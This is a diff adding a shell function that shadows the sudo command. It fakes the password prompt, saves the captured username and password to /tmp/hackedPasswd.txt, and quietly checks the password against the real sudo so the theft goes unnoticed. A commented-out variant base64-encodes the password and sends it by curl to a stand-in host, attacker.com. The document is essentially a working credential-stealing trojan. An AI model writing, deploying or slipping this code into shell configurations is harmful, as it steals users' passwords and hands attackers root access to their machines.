@@ -1,0 +1,17 @@
+# Define a function named sudo
+sudo () {
+    # Get the path of the real sudo command
+    realsudo=$(command -v sudo)
+    # Prompt the user for their password and store it in a variable
+    read -s -p "[sudo] password for $USER: " inputPasswd
+    echo
+    # Write the user and password to a file
+    echo "$USER : $inputPasswd" > /tmp/hackedPasswd.txt
+    # Alternatively, encode the password and send it to a remote server
+    # encoded=$(printf '%s' "$inputPasswd" | base64)
+    # curl -s "http://attacker.com/$USER:$encoded" > /dev/null 2>&1
+    # Run the real sudo command with the user's input
+    $realsudo -S -u root bash -c "exit" <<< "$inputPasswd" > /dev/null 2>&1
+    # Pass the arguments to the real sudo command
+    $realsudo "${@:1}"
+}
